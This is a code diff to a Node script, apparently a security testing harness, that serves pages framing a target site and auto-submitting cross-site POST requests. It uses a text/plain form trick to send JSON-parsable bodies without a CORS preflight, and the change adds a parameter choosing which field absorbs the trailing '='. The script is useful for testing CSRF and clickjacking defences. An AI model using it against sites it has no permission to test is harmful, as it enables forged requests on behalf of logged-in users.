@@ -3,10 +3,11 @@
 // cross-site API calls (does a credentialed fetch from another site get through?).
 // Usage: node attacker-page.mjs <target-origin> [port=4330]
 //   /frame?path=/        the target page in an iframe
-//   /form?path=/api/x&body={"message":"hi"}[&top=1]
+//   /form?path=/api/x&body={"message":"hi"}[&field=message][&top=1]
 //                        auto-submits a cross-site POST with a text/plain body that parses as JSON
 //                        (no preflight; request.json() and many parsers accept it). The form's
-//                        "=" goes inside the last string field, so no extra field is added.
+//                        "=" goes at the end of a string field (field=<name>, default the last
+//                        one), so no extra field is added.
 //                        top=1 submits as a top-level navigation instead of into an iframe: some
 //                        browser versions send cookies without a SameSite attribute only that way
 //                        (Lax+POST, for two minutes after the cookie is set)
@@ -65,7 +66,7 @@ out('framing ' + C.url + ' — take a screenshot: an unprotected app renders bel
 const f = document.createElement('iframe'); f.src = C.url; f.width = 1000; f.height = 700
 f.onload = () => out('iframe load event fired (it fires for refused frames too, so look at the frame)')
 document.body.appendChild(f)`),
-  '/form': (url, q) => page('form', { url, body: q.get('body') || '{"probe":"csrf"}', top: q.get('top') === '1' }, `
+  '/form': (url, q) => page('form', { url, body: q.get('body') || '{"probe":"csrf"}', field: q.get('field'), top: q.get('top') === '1' }, `
 let obj; try { obj = JSON.parse(C.body) } catch { out('body must be a JSON object'); throw new Error('bad body') }
 if (obj === null || typeof obj !== 'object' || Array.isArray(obj)) { out('body must be a JSON object'); throw new Error('bad body') }
 // text/plain form trick: the browser sends name + "=" + value. Move a top-level string field to
@@ -73,7 +74,10 @@ if (obj === null || typeof obj !== 'object' || Array.isArray(obj)) { out('body m
 // -> {"stream":false,"message":"hi="}) and no field is added: a strict schema then has no unrelated
 // reason to reject the probe. The JSON is built by hand so a "__proto__" key stays a plain field.
 const entries = Object.entries(obj)
-const i = entries.map(([, v]) => typeof v).lastIndexOf('string')
+// field=<name> picks the free-text field that may end in "="; by default, the last string field.
+const i = C.field !== null ? entries.findIndex(([k, v]) => k === C.field && typeof v === 'string')
+  : entries.map(([, v]) => typeof v).lastIndexOf('string')
+if (C.field !== null && i < 0) { out('field ' + JSON.stringify(C.field) + ' is not a top-level string field of body'); throw new Error('bad field') }
 let head, tail = '"}'
 if (i >= 0) {
   const ordered = entries.filter((_, j) => j !== i).concat([entries[i]])
